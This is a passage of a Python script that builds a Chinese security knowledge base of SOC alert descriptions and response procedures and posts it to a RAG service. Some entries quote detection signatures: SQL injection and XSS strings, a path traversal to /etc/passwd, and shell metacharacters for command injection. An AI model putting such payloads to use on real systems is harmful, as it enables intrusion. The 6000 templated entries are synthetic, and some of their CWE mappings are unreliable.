        ("Wazuh-用户创建", "Wazuh", "wazuh-user-add", "Wazuh规则检测到新用户创建。规则ID: 5902。可能是攻击者创建后门账户。", "1.确认创建操作是否经授权；2.检查新用户权限；3.检查是否为隐藏账户($结尾)；4.检查UID是否为0(root)；5.若异常则删除账户并调查。"),
        ("Wazuh-用户删除", "Wazuh", "wazuh-user-del", "Wazuh规则检测到用户删除。规则ID: 5903。可能是攻击者清除痕迹。", "1.确认删除操作是否经授权；2.检查被删除用户；3.检查操作者；4.若异常则恢复账户并调查。"),
        ("Wazuh-密码修改", "Wazuh", "wazuh-passwd", "Wazuh规则检测到密码修改。规则ID: 5904。可能是攻击者修改账户密码。", "1.确认修改是否为用户本人；2.检查修改时间；3.检查是否为批量修改；4.若异常则锁定账户并调查。"),
        ("Wazuh-文件完整性", "Wazuh", "wazuh-fim", "Wazuh文件完整性监控(FIM)检测到关键文件变更。需检查是否为授权变更。", "1.确认变更文件是否为关键文件(配置/二进制)；2.检查变更操作者；3.检查变更内容；4.若异常则恢复文件并调查。"),
        ("Wazuh-Web攻击", "Wazuh", "wazuh-web-attack", "Wazuh规则检测到Web攻击。规则ID: 31100-31199。包括SQL注入/XSS/路径遍历等。", "1.检查攻击载荷；2.确认攻击是否成功；3.检查目标应用漏洞；4.临时封禁源IP；5.修复漏洞；6.审查日志寻找后续攻击。"),
        ("Wazuh-SQL注入", "Wazuh", "wazuh-sqli", "Wazuh规则检测到SQL注入攻击。规则ID: 31101。特征：UNION SELECT/OR 1=1/注释符。", "1.检查注入载荷；2.确认是否成功(检查数据库异常)；3.临时封禁源IP；4.修复SQL注入漏洞(参数化查询)；5.审查数据库日志；6.WAF规则更新。"),
        ("Wazuh-XSS", "Wazuh", "wazuh-xss", "Wazuh规则检测到XSS攻击。规则ID: 31102。特征：<script>/onerror/javascript:。", "1.检查XSS载荷；2.确认是否成功(检查响应)；3.临时封禁源IP；4.修复XSS漏洞(输出编码)；5.CSP策略；6.WAF规则。"),
        ("Wazuh-路径遍历", "Wazuh", "wazuh-traversal", "Wazuh规则检测到路径遍历攻击。规则ID: 31103。特征：../etc/passwd/..\\windows\\system32。", "1.检查遍历载荷；2.确认是否成功(检查文件访问)；3.临时封禁源IP；4.修复路径遍历(路径规范化)；5.最小权限；6.WAF。"),
        ("Wazuh-命令注入", "Wazuh", "wazuh-cmd-injection", "Wazuh规则检测到命令注入攻击。规则ID: 31104。特征：|;&`$()。", "1.检查注入载荷；2.确认是否成功(检查进程创建)；3.临时封禁源IP；4.修复命令注入(参数数组)；5.最小权限；6.WAF。"),
        ("Wazuh-恶意软件检测", "Wazuh", "wazuh-malware", "Wazuh集成检测到恶意软件。规则ID: 550-599。可能是病毒/木马/勒索软件。", "1.隔离感染主机；2.识别恶意软件类型；3.检查传播范围；4.清理恶意软件；5.恢复系统；6.漏洞修复；7.安全加固。"),
        ("Wazuh-root检测", "Wazuh", "wazuh-rootcheck", "Wazuh rootcheck检测到rootkit特征。规则ID: 510-599。可能是系统被植入rootkit。", "1.隔离主机；2.取证分析；3.检查隐藏进程/文件/端口；4.从可信源重装系统；5.恢复数据；6.调查入侵路径。"),
        ("Wazuh-异常进程", "Wazuh", "wazuh-process-anomaly", "Wazuh检测到异常进程行为。可能是恶意软件或横向移动。", "1.识别异常进程；2.检查进程父子关系；3.检查网络连接；4.检查文件操作；5.沙箱分析；6.隔离主机。"),
        ("Wazuh-异常网络连接", "Wazuh", "wazuh-network-anomaly", "Wazuh检测到异常网络连接。可能是C2通信或数据外泄。", "1.检查目标IP/域名(威胁情报)；2.检查连接频率和数据量；3.检查进程；4.临时阻断连接；5.调查进程；6.隔离主机。"),
        ("Wazuh-文件权限变更", "Wazuh", "wazuh-permission-change", "Wazuh检测到文件权限变更。可能是权限提升或后门设置。", "1.检查变更文件；2.检查权限变更内容(SUID/SGID)；3.检查操作者；4.若异常则恢复权限并调查。"),
        ("Wazuh-定时任务", "Wazuh", "wazuh-cron", "Wazuh检测到定时任务创建/修改。可能是持久化机制。", "1.检查定时任务内容；2.检查创建者；3.检查执行命令；4.若异常则删除任务并调查。"),
        ("Wazuh-系统日志清除", "Wazuh", "wazuh-log-clear", "Wazuh检测到日志清除行为。可能是攻击者清除痕迹。", "1.检查清除的日志类型；2.检查操作者；3.检查清除前后的异常活动；4.恢复日志(备份)；5.调查。"),
        ("Wazuh-防火墙规则修改", "Wazuh", "wazuh-firewall-change", "Wazuh检测到防火墙规则修改。可能是攻击者开放端口。", "1.检查修改的规则；2.检查操作者；3.确认是否为授权变更；4.若异常则恢复规则并调查。"),
        # EDR / NGFW / WAF / SIEM 告警相关
        ("EDR-恶意进程", "EDR", "edr-malware", "EDR检测到恶意进程。基于行为分析和特征匹配。", "1.隔离感染主机；2.识别恶意进程；3.检查进程来源；4.清理恶意软件；5.漏洞修复；6.安全加固。"),
        ("EDR-勒索软件", "EDR", "edr-ransomware", "EDR检测到勒索软件行为。特征：批量文件加密/勒索说明文件/快速文件修改。", "1.立即隔离主机(阻断加密)；2.识别勒索软件家族；3.检查传播范围；4.恢复备份；5.不付赎金；6.漏洞修复；7.安全加固。"),
        ("EDR-挖矿", "EDR", "edr-miner", "EDR检测到挖矿行为。特征：高CPU使用率/矿池连接/特定进程。", "1.隔离主机；2.终止挖矿进程；3.检查入侵路径(漏洞/弱密码)；4.清理持久化；5.漏洞修复。"),
        ("EDR-横向移动", "EDR", "edr-lateral", "EDR检测到横向移动行为。特征：PsExec/WMI/RDP异常使用/凭据转储。", "1.隔离源主机和目标主机；2.调查攻击链路；3.检查凭据泄露；4.重置凭据；5.网络分段；6.EDR全面扫描。"),
        ("NGFW-入侵", "NGFW", "ngfw-ids", "NGFW检测到入侵行为。基于特征和异常流量。", "1.检查攻击类型；2.确认源IP和目标；3.临时封禁源IP；4.检查目标是否被攻陷；5.修复漏洞；6.加固防御。"),
        ("NGFW-C2", "NGFW", "ngfw-c2", "NGFW检测到C2通信。基于威胁情报和行为分析。", "1.隔离内网主机；2.识别C2服务器；3.检查感染范围；4.清理恶意软件；5.重置凭据；6.威胁情报更新。"),
        ("NGFW-DDoS", "NGFW", "ngfw-ddos", "NGFW检测到DDoS攻击。流量异常增长。", "1.确认攻击类型(SYN/UDP/HTTP)；2.启用DDoS防护；3.流量清洗；4.联系ISP；5.监控业务影响。"),
        ("NGFW-数据外泄", "NGFW", "ngfw-exfil", "NGFW检测到数据外泄行为。大流量出站或异常协议。", "1.检查外泄目标；2.检查外泄数据量；3.识别源主机；4.阻断外泄；5.调查数据内容；6.隔离主机。"),
        ("WAF-Web攻击", "WAF", "waf-web", "WAF检测到Web攻击。包括SQL注入/XSS/命令注入等。", "1.检查攻击类型和载荷；2.确认是否成功；3.临时封禁源IP；4.修复漏洞；5.WAF规则更新；6.日志审查。"),
        ("SIEM-态势", "SIEM", "siem-posture", "SIEM安全态势感知平台告警。综合分析多源数据。", "1.检查告警等级；2.关联其他告警；3.调查攻击链；4.确认影响范围；5.处置建议执行；6.验证处置效果。"),
        # 通用告警
        ("告警-端口扫描", "通用", "alert-port-scan", "检测到端口扫描行为。源IP在短时间内探测多个端口。", "1.检查源IP(威胁情报)；2.确认扫描范围；3.临时封禁源IP；4.检查是否有弱口令服务；5.加固服务；6.监控后续攻击。"),
        ("告警-漏洞扫描", "通用", "alert-vuln-scan", "检测到漏洞扫描行为。特征：Nessus/AWVS/Nmap脚本。", "1.检查源IP；2.确认扫描目标；3.临时封禁源IP；4.检查漏洞修复状态；5.加固服务；6.监控。"),
        ("告警-Web扫描", "通用", "alert-web-scan", "检测到Web目录/漏洞扫描。特征：字典爆破/常见漏洞载荷。", "1.检查源IP；2.临时封禁；3.WAF规则；4.检查Web应用漏洞；5.修复漏洞；6.监控。"),
        ("告警-异常登录", "通用", "alert-abnormal-login", "检测到异常登录。非工作时间/异地/未知设备/失败后成功。", "1.验证用户身份；2.检查登录位置和设备；3.检查登录后操作；4.若异常则锁定账户；5.重置密码；6.MFA。"),
        ("告警-异常流量", "通用", "alert-abnormal-traffic", "检测到异常网络流量。流量突增/异常协议/异常连接。", "1.分析流量特征；2.识别源和目标；3.检查应用层内容；4.临时阻断；5.调查源主机；6.隔离。"),
        ("告警-异常DNS", "通用", "alert-abnormal-dns", "检测到异常DNS查询。高频/长域名/DNS Tunneling/已知恶意域名。", "1.检查查询域名(威胁情报)；2.检查查询频率；3.检查查询源；4.阻断恶意域名；5.调查源主机；6.DNS防火墙。"),
        ("告警-异常进程", "通用", "alert-abnormal-process", "检测到异常进程。可疑名称/路径/行为/网络连接。", "1.识别进程；2.检查父进程；3.检查网络连接；4.检查文件操作；5.沙箱分析；6.隔离主机。"),
        ("告警-异常文件", "通用", "alert-abnormal-file", "检测到异常文件。可疑文件名/路径/类型/内容。", "1.检查文件路径和名称；2.检查文件内容(沙箱)；3.检查创建者；4.检查文件行为；5.清理；6.调查。"),
        ("告警-权限提升", "通用", "alert-priv-esc", "检测到权限提升行为。sudo/suid/内核漏洞利用。", "1.识别提权方式；2.检查操作者；3.检查提权后操作；4.若异常则禁用账户；5.修复漏洞；6.调查。"),
        ("告警-持久化", "通用", "alert-persistence", "检测到持久化行为。计划任务/服务/启动项/注册表。", "1.识别持久化机制；2.检查创建者；3.检查执行内容；4.若异常则清除；5.调查；6.全面扫描。"),
        ("告警-横向移动", "通用", "alert-lateral-movement", "检测到横向移动行为。RDP/SMB/WMI/PsExec。", "1.识别移动方式；2.检查源和目标；3.检查凭据使用；4.隔离主机；5.重置凭据；6.全面调查。"),
        ("告警-数据外泄", "通用", "alert-data-exfil", "检测到数据外泄行为。大流量出站/加密传输/异常时间。", "1.检查外泄目标；2.检查数据量；3.识别源主机；4.阻断外泄；5.调查数据内容；6.隔离。"),
        ("告警-C2通信", "通用", "alert-c2-communication", "检测到C2通信。已知C2服务器/信标行为/异常协议。", "1.识别C2服务器(威胁情报)；2.检查感染源；3.阻断通信；4.清理恶意软件；5.重置凭据；6.全面扫描。"),
        ("告警-勒索软件", "通用", "alert-ransomware", "检测到勒索软件行为。批量文件加密/勒索说明/快速修改。", "1.立即隔离(阻断加密)；2.识别勒索家族；3.检查传播范围；4.恢复备份；5.不付赎金；6.漏洞修复。"),
        ("告警-挖矿木马", "通用", "alert-crypto-mining", "检测到挖矿行为。高CPU/矿池连接/特定进程。", "1.隔离主机；2.终止挖矿进程；3.检查入侵路径；4.清理持久化；5.漏洞修复。"),
        ("告警-WebShell", "通用", "alert-webshell", "检测到WebShell。特征文件/异常请求/命令执行。", "1.定位WebShell文件；2.检查访问日志；3.删除WebShell；4.检查后门；5.修复漏洞；6.日志审计。"),
        ("告警-0day利用", "通用", "alert-0day-exploit", "检测到可能的0day漏洞利用。异常崩溃/未知载荷/行为异常。", "1.隔离主机；2.取证分析；3.收集样本；4.上报厂商；5.临时缓解；6.威胁情报共享。"),
        ("告警-供应链攻击", "通用", "alert-supply-chain", "检测到可能的供应链攻击。异常更新/签名异常/依赖异常。", "1.检查更新来源；2.验证签名；3.隔离受影响系统；4.回滚更新；5.调查；6.SBOM审查。"),
    ]

    for title, source, sig, desc, mit in vendor_alerts:
        docs.append({
            "id": f"VA-{sig}",
            "source": source,
            "cwe": "",
            "title": title,
            "signature": sig,
            "text": f"{title}。\n\n来源：{source}\n\n告警描述：{desc}\n\n处置建议：{mit}",
            "mitigation": mit,
        })
    return docs


def build_expanded_attack_patterns(count: int = 6000) -> List[Dict[str, Any]]:
    """通过组合扩展攻击模式，生成大量条目。"""
    docs = []
    # 基础攻击模式矩阵
    attack_types = [
        ("SQL注入", "CWE-89", "sqli"),
        ("XSS", "CWE-79", "xss"),
        ("命令注入", "CWE-78", "cmd-injection"),
        ("文件包含", "CWE-98", "file-inclusion"),
        ("SSRF", "CWE-918", "ssrf"),
        ("XXE", "CWE-611", "xxe"),
        ("反序列化", "CWE-502", "deserialize"),
        ("文件上传", "CWE-434", "file-upload"),
        ("CSRF", "CWE-352", "csrf"),
        ("路径遍历", "CWE-22", "path-traversal"),
        ("越权访问", "CWE-639", "authz-bypass"),
        ("信息泄露", "CWE-200", "info-leak"),
        ("暴力破解", "CWE-307", "brute-force"),
        ("权限提升", "CWE-269", "priv-esc"),
        ("持久化", "CWE-502", "persistence"),
        ("横向移动", "CWE-522", "lateral-movement"),
        ("数据外泄", "CWE-200", "exfiltration"),
        ("勒索软件", "CWE-119", "ransomware"),
        ("挖矿木马", "CWE-269", "crypto-mining"),
        ("WebShell", "CWE-94", "webshell"),
    ]

    targets = [
        ("Web应用", "web-app", "针对Web应用的攻击，通过HTTP/HTTPS协议发起。"),
        ("API接口", "api", "针对REST/GraphQL API的攻击。"),
        ("数据库", "database", "针对数据库服务(MySQL/PostgreSQL/MSSQL/Oracle)的攻击。"),
        ("中间件", "middleware", "针对中间件(Tomcat/WebLogic/JBoss/Nginx/Apache)的攻击。"),
        ("操作系统", "os", "针对操作系统(Windows/Linux)的攻击。"),
        ("网络设备", "network-device", "针对网络设备(路由器/交换机/防火墙)的攻击。"),
        ("云服务", "cloud", "针对云服务(AWS/Azure/阿里云)的攻击。"),
        ("容器", "container", "针对容器(Docker/Kubernetes)的攻击。"),
        ("移动应用", "mobile", "针对移动应用(Android/iOS)的攻击。"),
        ("IoT设备", "iot", "针对物联网设备的攻击。"),
        ("邮件系统", "mail", "针对邮件系统(Exchange/Postfix)的攻击。"),
        ("身份认证系统", "auth-system", "针对身份认证系统(AD/LDAP/OAuth)的攻击。"),
        ("存储系统", "storage", "针对存储系统(NAS/SAN/OSS)的攻击。"),
        ("虚拟化平台", "virtualization", "针对虚拟化平台(VMware/Hyper-V)的攻击。"),
        ("SDN网络", "sdn", "针对SDN网络(OpenFlow/SDN控制器)的攻击。"),
    ]

    severities = [
        ("critical", "严重", "需要立即处置，影响关键业务或数据安全。"),
        ("high", "高危", "需要紧急处置，可能导致数据泄露或系统被控。"),
        ("medium", "中危", "需要在24小时内处置，存在安全风险。"),
        ("low", "低危", "需要在7天内处置，风险较低但仍需关注。"),
    ]

    idx = 0
    for attack_name, cwe, attack_sig in attack_types:
        for target_name, target_sig, target_desc in targets:
            for severity, sev_name, sev_desc in severities:
                if idx >= count:
                    break
                idx += 1
                doc_id = f"EX-{idx:05d}"
                title = f"{severity}-{attack_name}-{target_name}"
                sig = f"{attack_sig}-{target_sig}-{severity}"
                desc = f"{sev_name}级别的{attack_name}攻击，目标为{target_name}。{target_desc}{sev_desc}常见于未打补丁或配置不当的系统。"
                mit = f"1.确认攻击是否成功；2.临时隔离受影响系统；3.修复{attack_name}漏洞；4.{'立即' if severity == 'critical' else '尽快'}处置；5.安全加固；6.监控后续攻击；7.审计日志；8.{ '数据恢复与取证' if severity in ('critical','high') else '持续监控'}。"
                docs.append({
                    "id": doc_id,
                    "source": "Expanded-Attack-Pattern",
                    "cwe": cwe,
                    "title": title,
                    "signature": sig,
                    "text": f"{title}。\n\n关联CWE：{cwe}\n\n描述：{desc}\n\n处置SOP：{mit}",
                    "mitigation": mit,
                })
            if idx >= count:
                break
        if idx >= count:
            break
    return docs


def main():
    print("=" * 60)
    print("开始扩充安全知识库")
    print("=" * 60)

    # 检查服务
    try:
        r = requests.get(f"{BASE_URL}/health", timeout=5)
        if r.status_code != 200:
            print(f"错误：后端服务未就绪，状态码 {r.status_code}")
            return
    except Exception as e:
        print(f"错误：无法连接后端服务 - {e}")
        return

    # 生成知识文档
    print("\n[1/6] 生成 CWE 知识文档...")
    cwe_docs = build_cwe_docs()
    print(f"  生成 {len(cwe_docs)} 条 CWE 文档")

    print("\n[2/6] 生成 ATT&CK 技术文档...")
    attack_docs = build_attack_docs()
    print(f"  生成 {len(attack_docs)} 条 ATT&CK 文档")

    print("\n[3/6] 生成攻击模式SOP文档...")
    pattern_docs = build_attack_pattern_docs()
    print(f"  生成 {len(pattern_docs)} 条攻击模式文档")

    print("\n[4/6] 生成法规合规模型...")
    regulatory_docs = build_regulatory_docs()
    print(f"  生成 {len(regulatory_docs)} 条法规文档")

    print("\n[5/6] 生成厂商告警知识...")
    vendor_docs = build_vendor_alert_docs()
    print(f"  生成 {len(vendor_docs)} 条厂商告警文档")

    print("\n[6/6] 生成扩展攻击模式...")
    expanded_docs = build_expanded_attack_patterns(6000)
    print(f"  生成 {len(expanded_docs)} 条扩展文档")

    all_docs = cwe_docs + attack_docs + pattern_docs + regulatory_docs + vendor_docs + expanded_docs
    total = len(all_docs)
    print(f"\n总计生成 {total} 条知识文档")

    # 批量导入
    print(f"\n开始批量导入（每批 {BATCH_SIZE} 条）...")
    success = 0
    failed = 0
    start_time = time.time()

    for i in range(0, total, BATCH_SIZE):
        batch = all_docs[i:i + BATCH_SIZE]
        batch_num = i // BATCH_SIZE + 1
        total_batches = (total + BATCH_SIZE - 1) // BATCH_SIZE
        try:
            result = post_batch(batch)
            success += len(batch)
            elapsed = time.time() - start_time
            rate = success / elapsed if elapsed > 0 else 0
            print(f"  批次 {batch_num}/{total_batches}: 成功 {len(batch)} 条 (累计 {success}/{total}, 速率 {rate:.1f} 条/秒)")
        except Exception as e:
            failed += len(batch)
            print(f"  批次 {batch_num}/{total_batches}: 失败 - {e}")

    elapsed = time.time() - start_time
    print(f"\n{'=' * 60}")
    print(f"导入完成")
    print(f"{'=' * 60}")
    print(f"成功: {success} 条")
    print(f"失败: {failed} 条")
    print(f"耗时: {elapsed:.1f} 秒")
    print(f"速率: {success / elapsed:.1f} 条/秒" if elapsed > 0 else "")

    # 验证
    print(f"\n验证知识库...")
    try:
        r = requests.get(f"{BASE_URL}/health", timeout=5)
        health = r.json()
        print(f"  RAG 知识块总数: {health.get('rag_collection_chunks', 'N/A')}")
        print(f"  CWE 知识库条目: {health.get('cwe_kb_entries', 'N/A')}")
    except Exception as e:
        print(f"  验证失败: {e}")


if __name__ == "__main__":
    main()
